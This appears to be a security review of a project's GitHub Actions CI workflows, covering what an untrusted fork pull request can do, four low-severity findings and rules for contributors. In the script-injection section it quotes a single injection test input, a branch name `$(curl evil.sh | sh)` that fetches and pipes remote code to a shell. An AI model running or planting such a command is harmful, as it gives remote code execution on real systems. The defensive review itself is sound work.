# CI pipeline security review

A review of this repository's GitHub Actions workflows against the question that
matters for a public project: **what can an untrusted pull request do?**

Reviewed: `.github/workflows/ci.yml`, `security.yml`, `commitguard.yml`, and
`action.yml`. Date: 2026-09-17, against CommitGuard 0.1.0.dev0.

## Summary

No high-severity finding. The workflows follow the practices that matter most for
fork pull requests: no `pull_request_target`, no secrets, least-privilege tokens,
every Action pinned by commit SHA, and no shell interpolation of attacker
controlled text.

| # | Finding | Severity | Status |
|---|---|---|---|
| 1 | Test job runs untrusted pull request code | Accepted risk | by design; no secrets are available to it |
| 2 | `pip` cache shared between pull requests and `main` | Low | accepted; inputs are hash-pinned where it matters |
| 3 | No explicit job-level `permissions` in some jobs | Low | workflow-level `contents: read` already applies |
| 4 | Network installs from PyPI in CI | Low | hash-pinned for the Action; unpinned for the dev environment |

## What is done correctly

**No `pull_request_target`.** Every workflow triggers on `pull_request`, so a fork
pull request runs with a read-only token and **no access to repository secrets**.
This is the single most common way public projects are compromised, and it is
avoided here.

**Least privilege.** Each workflow declares `permissions: contents: read` at the
top. Nothing needs write access: CommitGuard's own check reports through the job
status, not the Checks API, so no token with `checks: write` is exposed.

**No credentials left in the workspace.** Every checkout sets
`persist-credentials: false`, so a malicious build step cannot read a token from
`.git/config` and push with it.

**Actions pinned by commit SHA**, with the human-readable version in a comment
(`actions/checkout@11bd719... # v4.2.2`). A moved tag cannot change what runs.

**No script injection.** Untrusted values (`github.event.pull_request.base.sha`,
`github.event.repository.default_branch`) are passed into steps through `env:`
and referenced as shell variables, never interpolated directly into a `run:`
script. A branch named `$(curl evil.sh | sh)` is therefore inert - and that exact
input is a test: `tests/integration/github/test_ci_security.py`.

**The scanner cannot be weakened by the pull request it judges.**
`.github/workflows/commitguard.yml` installs CommitGuard from a *trusted* commit
(the pull request base, the commit before a push, or the default branch) using
`git worktree`, and the policy is read from the base commit. A pull request that
edits the scanner, its rules or `.commitguard.yaml` still faces the original one.
Recorded as an experiment: `policy-tampering-in-pull-request`.

## Findings in detail

### 1. The test job runs untrusted pull request code (accepted risk)

`ci.yml` runs `pytest` on the pull request's code, on three operating systems. A
malicious pull request can execute arbitrary code in that runner. This is
unavoidable for a project that runs tests on contributions, and it is acceptable
**because** the job has no secrets and a read-only token: the blast radius is a
throw-away runner and whatever the runner can reach on the network.

What keeps it acceptable:

- no secrets are defined in the workflow or the repository for CI to use;
- the token is read-only;
- artifacts are not uploaded from that job, so nothing crosses back.

If secrets are ever needed in CI, they must go in a separate workflow that does
not run fork code, not into this job.

### 2. Shared `pip` cache (Low)

`actions/setup-python` with `cache: pip` shares a cache keyed on the lockfile
between runs, including runs of fork pull requests. A malicious pull request that
changes dependency inputs could poison a cache entry that a later run restores.

The impact here is limited: the Action's own install path uses
`--require-hashes`, so a poisoned wheel would fail verification. The developer
install (`pip install -e ".[dev]"`) is not hash-pinned and would be affected.
Accepted for now; the mitigation if it matters later is to disable the cache for
`pull_request` events or key it on the event name.

### 3. Job-level permissions (Low)

`permissions` is declared at workflow level, which applies to every job. Adding it
per job as well would make each job self-describing and survive a future refactor
that moves a job into another file. Cosmetic today.

### 4. Network installs (Low)

CI installs from PyPI. The Action's install is hash-pinned
(`requirements/ci.txt`, `--require-hashes --no-deps`); the development install is
not, so a compromised upstream release of a development tool (ruff, mypy, pytest)
would run in CI. Pinning the development tools with hashes as well is a
reasonable next step; it is listed as a gap in
[supply-chain.md](supply-chain.md#gaps-not-implemented).

## For contributors adding a workflow

1. Never use `pull_request_target`, and never add secrets to a workflow that runs
   fork code.
2. Pin every Action by full commit SHA.
3. Declare the narrowest `permissions` the job needs.
4. Pass `github.event.*` values through `env:`, never into a `run:` script
   directly.
5. Set `persist-credentials: false` on checkout.

`tests/unit/github/test_workflows_static.py` asserts several of these directly, so
a workflow that breaks them fails CI rather than review.
